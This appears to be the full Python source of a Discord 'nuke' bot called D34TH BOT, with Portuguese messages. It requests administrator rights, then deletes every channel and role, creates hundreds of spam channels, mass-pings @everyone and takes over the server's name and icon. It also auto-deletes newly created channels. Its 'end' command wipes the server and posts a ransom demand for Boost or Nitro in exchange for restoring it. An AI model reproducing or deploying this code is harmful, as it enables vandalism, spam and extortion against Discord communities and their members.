import discord
from discord.ext import commands
from discord import ButtonStyle, ui
import asyncio
import os
import sys
import random
import json
import aiohttp
from dotenv import load_dotenv
import threading
from flask import Flask
from datetime import datetime

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("TOKEN nao encontrado!")
    sys.exit(1)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

app = Flask('')

@app.route('/')
def home():
    return "D34TH BOT RODANDO!"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

threading.Thread(target=run_flask, daemon=True).start()

nuke_active = False
backup_data = {}

def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except:
        return "D34TH TEAM"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except:
        return False

def glitch_text(texto, intensidade=3):
    chars = ['¢','£','¤','¥','¦','§','¨','©','ª','«','¬','®','¯','°','±','²','³','´','µ','¶','·','¸','¹','º','»','¼','½','¾','¿','À','Á','Â','Ã','Ä','Å','Æ','Ç','È','É','Ê','Ë','Ì','Í','Î','Ï','Ð','Ñ','Ò','Ó','Ô','Õ','Ö','×','Ø','Ù','Ú','Û','Ü','Ý','Þ','ß','à','á','â','ã','ä','å','æ','ç','è','é','ê','ë','ì','í','î','ï','ð','ñ','ò','ó','ô','õ','ö','÷','ø','ù','ú','û','ü','ý','þ','ÿ']
    lista = list(texto)
    for _ in range(intensidade):
        if len(lista) > 1:
            i = random.randint(0, len(lista)-1)
            j = random.randint(0, len(lista)-1)
            if i != j:
                lista[i], lista[j] = lista[j], lista[i]
    if len(lista) > 3:
        for _ in range(intensidade):
            pos = random.randint(0, len(lista)-1)
            lista.insert(pos, random.choice(chars))
            if len(lista) > 20:
                break
    return ''.join(lista)

async def glitch_message(ctx, mensagem, tempo=10):
    try:
        msg = await ctx.send(mensagem)
        for _ in range(tempo * 2):
            await msg.edit(content=glitch_text(mensagem, random.randint(2,5)))
            await asyncio.sleep(0.5)
            if random.random() < 0.1:
                await msg.edit(content=mensagem)
                await asyncio.sleep(0.3)
        await msg.edit(content=mensagem)
    except:
        pass

BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=0&scope=bot+applications.commands"

# ========== FUNÇÃO DE BACKUP COMPLETO ==========
async def fazer_backup(guild):
    backup = {
        "nome": guild.name,
        "icone": str(guild.icon.url) if guild.icon else None,
        "categorias": [],
        "canais_texto": [],
        "canais_voz": [],
        "foruns": [],
        "cargos": [],
        "membros": {}
    }
    
    for categoria in guild.categories:
        backup["categorias"].append({
            "nome": categoria.name,
            "posicao": categoria.position,
            "id": categoria.id
        })
    
    for canal in guild.text_channels:
        backup["canais_texto"].append({
            "nome": canal.name,
            "posicao": canal.position,
            "categoria_id": canal.category_id,
            "topic": canal.topic,
            "slowmode_delay": canal.slowmode_delay,
            "nsfw": canal.nsfw
        })
    
    for canal in guild.voice_channels:
        backup["canais_voz"].append({
            "nome": canal.name,
            "posicao": canal.position,
            "categoria_id": canal.category_id,
            "bitrate": canal.bitrate,
            "user_limit": canal.user_limit
        })
    
    for forum in guild.forums:
        backup["foruns"].append({
            "nome": forum.name,
            "posicao": forum.position,
            "categoria_id": forum.category_id,
            "topic": forum.topic
        })
    
    for cargo in guild.roles:
        if cargo.name != "@everyone":
            backup["cargos"].append({
                "nome": cargo.name,
                "cor": cargo.color.value,
                "permissoes": cargo.permissions.value,
                "posicao": cargo.position,
                "hoist": cargo.hoist,
                "mentionable": cargo.mentionable
            })
    
    for member in guild.members:
        if not member.bot:
            cargos = [role.id for role in member.roles if role.name != "@everyone"]
            if cargos:
                backup["membros"][str(member.id)] = cargos
    
    return backup

# ========== FUNÇÃO DE RESTAURAÇÃO ==========
async def restaurar_servidor(guild, backup, admin_user_id):
    try:
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        
        cargos_criados = {}
        for cargo_data in backup["cargos"]:
            try:
                cargo = await guild.create_role(
                    name=cargo_data["nome"],
                    color=cargo_data["cor"],
                    permissions=discord.Permissions(cargo_data["permissoes"]),
                    hoist=cargo_data["hoist"],
                    mentionable=cargo_data["mentionable"]
                )
                cargos_criados[cargo_data["nome"]] = cargo
                await asyncio.sleep(0.05)
            except:
                pass
        
        categorias_criadas = {}
        for cat_data in backup["categorias"]:
            try:
                categoria = await guild.create_category(cat_data["nome"])
                categorias_criadas[cat_data["nome"]] = categoria
                await asyncio.sleep(0.05)
            except:
                pass
        
        for canal_data in backup["canais_texto"]:
            try:
                categoria = None
                if canal_data["categoria_id"]:
                    for cat in backup["categorias"]:
                        if cat["id"] == canal_data["categoria_id"]:
                            if cat["nome"] in categorias_criadas:
                                categoria = categorias_criadas[cat["nome"]]
                            break
                
                canal = await guild.create_text_channel(
                    canal_data["nome"],
                    category=categoria,
                    topic=canal_data.get("topic"),
                    slowmode_delay=canal_data.get("slowmode_delay", 0),
                    nsfw=canal_data.get("nsfw", False)
                )
                await asyncio.sleep(0.03)
            except:
                pass
        
        for canal_data in backup["canais_voz"]:
            try:
                categoria = None
                if canal_data["categoria_id"]:
                    for cat in backup["categorias"]:
                        if cat["id"] == canal_data["categoria_id"]:
                            if cat["nome"] in categorias_criadas:
                                categoria = categorias_criadas[cat["nome"]]
                            break
                
                canal = await guild.create_voice_channel(
                    canal_data["nome"],
                    category=categoria,
                    bitrate=canal_data.get("bitrate", 64000),
                    user_limit=canal_data.get("user_limit", 0)
                )
                await asyncio.sleep(0.03)
            except:
                pass
        
        for forum_data in backup["foruns"]:
            try:
                categoria = None
                if forum_data["categoria_id"]:
                    for cat in backup["categorias"]:
                        if cat["id"] == forum_data["categoria_id"]:
                            if cat["nome"] in categorias_criadas:
                                categoria = categorias_criadas[cat["nome"]]
                            break
                
                forum = await guild.create_forum_channel(
                    forum_data["nome"],
                    category=categoria,
                    topic=forum_data.get("topic")
                )
                await asyncio.sleep(0.03)
            except:
                pass
        
        try:
            await guild.edit(name=backup["nome"])
            if backup["icone"]:
                async with aiohttp.ClientSession() as session:
                    async with session.get(backup["icone"]) as resp:
                        if resp.status == 200:
                            await guild.edit(icon=await resp.read())
        except:
            pass
        
        admin_member = guild.get_member(admin_user_id)
        if admin_member:
            admin_role = await guild.create_role(name="ADMIN-D34TH", permissions=discord.Permissions.all())
            await admin_member.add_roles(admin_role)
        
        for user_id, cargos_ids in backup["membros"].items():
            member = guild.get_member(int(user_id))
            if member:
                for cargo_nome in cargos_ids:
                    if cargo_nome in cargos_criados:
                        try:
                            await member.add_roles(cargos_criados[cargo_nome])
                            await asyncio.sleep(0.02)
                        except:
                            pass
        
        return True
    except Exception as e:
        print(f"Erro na restauração: {e}")
        return False

# ========== BOTÃO REVERTER ==========
class ReverterButton(ui.View):
    def __init__(self, guild_id, guild_name):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.guild_name = guild_name

    @ui.button(label="REVERTER", style=ButtonStyle.green, custom_id="reverter")
    async def reverter_callback(self, interaction: discord.Interaction, button: ui.Button):
        try:
            support_guild = bot.get_guild(1545604817324347482)
            if support_guild:
                channel = discord.utils.get(support_guild.channels, name="pedidos")
                if channel:
                    embed = discord.Embed(
                        title="PEDIDO DE REVERSÃO",
                        description=f"**Servidor:** {self.guild_name}\n**ID:** {self.guild_id}\n**Solicitante:** {interaction.user.mention} ({interaction.user.id})",
                        color=discord.Color.green()
                    )
                    embed.set_footer(text="Clique no botão abaixo para confirmar a reversão")
                    
                    view = ConfirmarReversao(self.guild_id, interaction.user.id)
                    await channel.send(embed=embed, view=view)
                    await interaction.response.send_message("✅ Pedido enviado para o servidor de suporte!", ephemeral=True)
                else:
                    await interaction.response.send_message("❌ Canal 'pedidos' não encontrado no servidor de suporte!", ephemeral=True)
            else:
                await interaction.response.send_message("❌ Servidor de suporte não encontrado!", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)

class ConfirmarReversao(ui.View):
    def __init__(self, guild_id, user_id):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.user_id = user_id

    @ui.button(label="CONFIRMAR REVERSÃO", style=ButtonStyle.danger, custom_id="confirmar_reversao")
    async def confirmar_callback(self, interaction: discord.Interaction, button: ui.Button):
        try:
            guild = bot.get_guild(self.guild_id)
            if guild:
                if self.guild_id in backup_data:
                    backup = backup_data[self.guild_id]
                    await interaction.response.send_message("🔄 Iniciando restauração completa do servidor...", ephemeral=True)
                    
                    sucesso = await restaurar_servidor(guild, backup, self.user_id)
                    
                    if sucesso:
                        await interaction.followup.send("✅ **SERVIDOR RESTAURADO COM SUCESSO!**\n\nTodas as categorias, canais, cargos e permissões foram recuperados!", ephemeral=True)
                        if guild.text_channels:
                            embed = discord.Embed(
                                title="🔄 SERVIDOR RECUPERADO",
                                description=f"O servidor foi restaurado por {interaction.user.mention}\n\nEstrutura original recuperada!",
                                color=discord.Color.green()
                            )
                            await guild.text_channels[0].send(embed=embed)
                    else:
                        await interaction.followup.send("❌ Erro durante a restauração!", ephemeral=True)
                else:
                    await interaction.followup.send("❌ Backup não encontrado para este servidor!", ephemeral=True)
            else:
                await interaction.followup.send("❌ Servidor não encontrado!", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Erro: {str(e)}", ephemeral=True)

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    global nuke_active
    nuke_active = False
    print(f'Bot logado como {bot.user}')
    print(f'Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | D34TH"))

@bot.event
async def on_guild_join(guild):
    try:
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
    except:
        pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Comando nao encontrado! Use •help_bot", delete_after=5)

@bot.event
async def on_guild_channel_create(channel):
    global nuke_active
    if not nuke_active:
        try:
            await channel.delete()
            print(f"Canal {channel.name} apagado automaticamente!")
        except:
            pass

# ========== BOTÕES ==========
class InviteButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="COPIAR LINK", style=ButtonStyle.gray, custom_id="copy_invite")
    async def copy_invite(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_message(f"LINK:\n{BOT_INVITE_URL}", ephemeral=True)

class SpamButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="ENVIAR", style=ButtonStyle.gray, custom_id="spam_button")
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        texto = load_text()
        mensagem = f"{texto}\nD34TH TEAM"
        await interaction.response.send_message("Glitch...")
        msg = await interaction.original_response()
        for _ in range(10):
            await msg.edit(content=glitch_text(mensagem, random.randint(2,5)))
            await asyncio.sleep(0.4)
        await msg.edit(content=mensagem)# ========== COMANDOS ==========
@bot.command()
async def invite(ctx):
    try:
        await ctx.message.delete()
        embed = discord.Embed(title="D34TH BOT", description="Adicione o bot ao servidor\nPermissoes: Administrador", color=discord.Color.dark_gray())
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
        embed.set_footer(text="D34TH TEAM")
        view = InviteButton()
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def button(ctx):
    try:
        await ctx.message.delete()
        texto = load_text()
        embed = discord.Embed(title="D34TH SPAM", description=f"Mensagem: {texto}", color=discord.Color.dark_gray())
        view = SpamButton()
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def glitch(ctx, *, texto=None):
    try:
        await ctx.message.delete()
        if not texto:
            texto = load_text()
        await glitch_message(ctx, texto, 10)
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command()
async def update_server_icon(ctx):
    try:
        await ctx.message.delete()
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    await ctx.guild.edit(icon=await resp.read())
                    await ctx.send("Foto atualizada!", delete_after=5)
    except Exception as e:
        await ctx.send(f"Erro: {e}", delete_after=5)

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="PING", description=f"Latencia: {latency}ms", color=discord.Color.dark_gray())
    await ctx.send(embed=embed, delete_after=10)

@bot.command()
async def nuke(ctx):
    global nuke_active
    try:
        await ctx.message.delete()
        nuke_active = True
        texto = load_text()
        guild = ctx.guild
        
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
        
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
        except:
            pass
        
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.02)
            except:
                pass
        
        criados = 0
        canais = []
        
        for i in range(500):
            try:
                canal = await guild.create_text_channel(f"d34th-{i+1}")
                canais.append(canal)
                criados += 1
                await asyncio.sleep(0.01)
            except:
                break
        
        enviadas = 0
        everyone = "@everyone " * 10
        mensagem_base = f"{everyone}\n{texto}\nD34TH TEAM"
        
        for canal in canais:
            if isinstance(canal, discord.TextChannel):
                try:
                    msg = await canal.send(mensagem_base)
                    for _ in range(2):
                        await msg.edit(content=glitch_text(mensagem_base, 3))
                        await asyncio.sleep(0.1)
                    await msg.edit(content=mensagem_base)
                    enviadas += 1
                    await asyncio.sleep(0.01)
                except:
                    pass
        
        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
        if guild.text_channels:
            await guild.text_channels[0].send(embed=embed)
            
    except Exception as e:
        print(f"Erro nuke: {e}")
    finally:
        nuke_active = False

@bot.command()
async def end(ctx):
    global nuke_active
    try:
        await ctx.message.delete()
        nuke_active = True
        guild = ctx.guild
        
        await ctx.send("💾 **FAZENDO BACKUP DO SERVIDOR...**")
        backup = await fazer_backup(guild)
        backup_data[guild.id] = backup
        print(f"✅ Backup do servidor {guild.name} salvo!")
        
        nome_antigo = guild.name
        
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.02)
            except:
                pass
        
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
        
        canal_recuperacao = await guild.create_text_channel("💀-RECUPERACAO")
        await canal_recuperacao.set_permissions(guild.default_role, send_messages=False, read_messages=True)
        
        embed = discord.Embed(
            title="💀 SERVIDOR DESTRUÍDO",
            description=(
                "PARA RECUPERAR ESTE SERVIDOR ENTRE NO SERVIDOR ABAIXO E DE UM BOOST OU NITRO A UM DOS ADMINS\n\n"
                f"**Link:** https://discord.gg/YsgNdA83d\n\n"
                "Clique no botão abaixo para solicitar a reversão."
            ),
            color=discord.Color.dark_gray()
        )
        embed.set_footer(text="D34TH TEAM")
        
        view = ReverterButton(guild.id, nome_antigo)
        await canal_recuperacao.send(embed=embed, view=view)
        
        print(f"Servidor {guild.name} destruído. Backup salvo. Canal de recuperação criado.")
        
    except Exception as e:
        print(f"Erro end: {e}")
    finally:
        nuke_active = False

@bot.command()
async def rename_all(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="d34th-team")
                    contador += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        try:
            await guild.edit(name="D34TH TEAM")
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
        except:
            pass
        embed = discord.Embed(title="RENOMEADO", description=f"{contador} canais", color=discord.Color.dark_gray())
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def set_text(ctx, *, texto):
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(title="TEXTO ATUALIZADO", description=f"{texto}", color=discord.Color.dark_gray())
            await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    try:
        await ctx.message.delete()
        if quantidade > 500:
            quantidade = 500
        criados = 0
        for i in range(quantidade):
            try:
                await ctx.guild.create_text_channel(f"channel-{i+1}")
                criados += 1
                await asyncio.sleep(0.02)
            except:
                break
        embed = discord.Embed(title="CRIADOS", description=f"{criados} canais", color=discord.Color.dark_gray())
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        for i in range(quantidade):
            msg = f"{texto}\nD34TH TEAM\n{i+1}/{quantidade}"
            await glitch_message(target, msg, 3)
            await asyncio.sleep(0.05)
        await ctx.send(f"{quantidade} enviadas", delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {e}', delete_after=5)

@bot.command()
async def help_bot(ctx):
    embed = discord.Embed(title="D34TH BOT", description="COMANDOS", color=discord.Color.dark_gray())
    embed.add_field(name="COMANDOS", value="`•invite`\n`•button`\n`•glitch`\n`•ping`\n`•nuke`\n`•end`\n`•rename_all`\n`•set_text`\n`•create_channels`\n`•spam`\n`•update_server_icon`", inline=False)
    embed.add_field(name="ESTATISTICAS", value=f"SERVIDORES: {len(bot.guilds)}\nUSUARIOS: {len(bot.users)}", inline=True)
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
    embed.set_footer(text="D34TH TEAM")
    await ctx.send(embed=embed)

@bot.command()
async def backup_info(ctx):
    try:
        await ctx.message.delete()
        embed = discord.Embed(
            title="💾 BACKUPS SALVOS",
            description=f"Total de backups: {len(backup_data)}",
            color=discord.Color.dark_gray()
        )
        for guild_id, backup in backup_data.items():
            guild = bot.get_guild(guild_id)
            nome = guild.name if guild else "Servidor desconhecido"
            embed.add_field(
                name=nome,
                value=f"ID: {guild_id}\nCanais: {len(backup['canais_texto'] + backup['canais_voz'] + backup['foruns'])}\nCargos: {len(backup['cargos'])}",
                inline=True
            )
        await ctx.send(embed=embed, delete_after=30)
    except Exception as e:
        await ctx.send(f"❌ Erro ao mostrar backups: {str(e)}", delete_after=10)

if __name__ == "__main__":
    print("Iniciando D34TH TEAM...")
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"Erro: {e}")
